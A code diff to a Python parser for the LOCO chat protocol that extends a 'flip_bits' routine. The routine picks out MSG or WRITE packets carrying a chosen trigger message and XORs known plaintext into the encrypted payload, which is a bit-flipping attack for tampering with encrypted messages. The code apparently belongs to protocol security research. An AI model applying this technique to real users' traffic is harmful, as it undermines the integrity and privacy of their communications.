@@ -3,11 +3,15 @@ import logging
 import struct
 
 import bson
-
-from lib.crypto_utils import (aes_decrypt, aes_e2e_decrypt, compute_nonce,
-                              get_clean_public_key, rsa_decrypt, rsa_encrypt)
-from lib.loco_packet import (LocoEncryptedPacket, LocoHandshakePacket,
-                             LocoPacket)
+from lib.crypto_utils import (
+    aes_decrypt,
+    aes_e2e_decrypt,
+    compute_nonce,
+    get_clean_public_key,
+    rsa_decrypt,
+    rsa_encrypt,
+)
+from lib.loco_packet import LocoEncryptedPacket, LocoHandshakePacket, LocoPacket
 
 
 class LocoParser:
@@ -126,22 +130,30 @@ class LocoParser:
     def _xor(self, param1, param2):
         return bytes((x ^ y) for (x, y) in zip(param1, param2))
 
-    def flip_bits(self):
-        if self.loco_packet.loco_command != "MSG":
+    def flip_bits(self, trigger_message):
+        if not self.loco_packet:
             return None
 
-        if self.loco_packet.body_length != 221:
-            logging.error("I'm NOT here: %s", self.loco_packet.body_length)
+        if self.loco_packet.loco_command not in ["MSG", "WRITE"]:
             return None
-        else:
-            logging.error("I'm here!")
 
-        # Patch size
+        body_json = self.loco_packet.body_payload
+
+        # Read message from "MSG" LOCO packet
+        if (
+            "chatLog" in body_json
+            and body_json["chatLog"]["message"] != trigger_message
+        ):
+            return None
+
+        # Patch size of the "message" field value
         # body = bytearray(self.loco_packet.body_payload)
         # body[128:129] = b"\x0F"
         # self.loco_packet.body_payload = bytes(body)
         # loco_encrypted = aes_encrypt(self.loco_packet.get_packet_bytes(), self.loco_encrypted_packet.iv)
         loco_encrypted = self.loco_encrypted_packet.payload
+
+        logging.warning("Flipping bits with known plaintext: %s", trigger_message)
 
         ciphertext = bytearray(loco_encrypted)
         p11 = b"AAAAAAAAAAAAAAAA"
